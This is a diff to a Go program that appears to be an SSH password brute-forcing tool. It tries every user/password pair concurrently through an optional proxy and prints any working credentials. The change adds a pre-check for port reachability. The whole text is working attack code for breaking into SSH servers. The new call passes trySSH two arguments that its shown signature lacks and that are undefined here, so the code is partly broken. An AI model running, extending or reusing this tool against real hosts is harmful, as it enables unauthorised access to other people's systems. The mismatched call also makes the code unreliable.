@@ -42,28 +42,35 @@ func ensurePort(addresses []string) []string {
 
 // burstIP attempts SSH connections using provided credentials and proxy.
 func burstIP(address string, users, passwords []string, dialer proxy.Dialer, threadCount, detail int) {
-    addrCtx, addrCancel := context.WithCancel(context.Background())
-    defer addrCancel() // 确保在函数结束时调用addrCancel，避免资源泄漏
-    var wg sync.WaitGroup
-    semaphore := make(chan struct{}, threadCount)
-    for _, user := range users {
-        for _, pass := range passwords {
-            select {
-            case <-addrCtx.Done():
-                return
-            case semaphore <- struct{}{}:
-            }
-            wg.Add(1)
-            go func(user, pass string) {
-                defer wg.Done()
-                if trySSH(user, pass, address, dialer, detail) {
-                    addrCancel() // 成功的情况下提前退出
-                }
-                <-semaphore
-            }(user, pass)
-        }
-    }
-    wg.Wait()
+	if !checkPortReachability(address, dialer) {
+		return // End the goroutine if the port is not reachable
+	}
+
+	addrCtx, addrCancel := context.WithCancel(context.Background())
+	defer addrCancel() // Ensure addrCancel is called on function exit to avoid resource leak
+
+	var wg sync.WaitGroup
+	semaphore := make(chan struct{}, threadCount)
+
+	for _, user := range users {
+		for _, pass := range passwords {
+			select {
+			case <-addrCtx.Done():
+				return
+			case semaphore <- struct{}{}:
+			}
+
+			wg.Add(1)
+			go func(user, pass string) {
+				defer wg.Done()
+				if trySSH(user, pass, address, dialer, detail, requestList, requestListItemsP) {
+					addrCancel() // Exit early if successful
+				}
+				<-semaphore
+			}(user, pass)
+		}
+	}
+	wg.Wait()
 }
 
 
@@ -94,6 +101,36 @@ func trySSH(user, pass, address string, dialer proxy.Dialer, detail int) bool {
 	defer client.Close()
 
 	fmt.Printf("Success: %s@%s with password %s\n", user, address, pass)
+	return true
+}
+
+// checkPortReachability tries to establish a TCP connection to the given address to check if the port is reachable using the provided proxy.
+func checkPortReachability(address string, dialer proxy.Dialer) bool {
+	timeout := 5 * time.Second // Set a reasonable timeout
+
+	// Creating a net.Dialer with a specific timeout
+	netDialer := &net.Dialer{
+		Timeout: timeout,
+	}
+
+	// If a proxy is set (not proxy.Direct), we use the proxy to dial the connection
+	if dialer != proxy.Direct {
+		conn, err := dialer.Dial("tcp", address)
+		if err != nil {
+			fmt.Println(`[ ! ]` + address + ` Port unreachable`)
+			return false
+		}
+		conn.Close()
+		return true
+	}
+
+	// If no proxy, we use the net.Dialer directly to dial the connection
+	conn, err := netDialer.Dial("tcp", address)
+	if err != nil {
+		fmt.Println(`[ ! ]` + address + ` Port unreachable`)
+		return false
+	}
+	conn.Close()
 	return true
 }
 
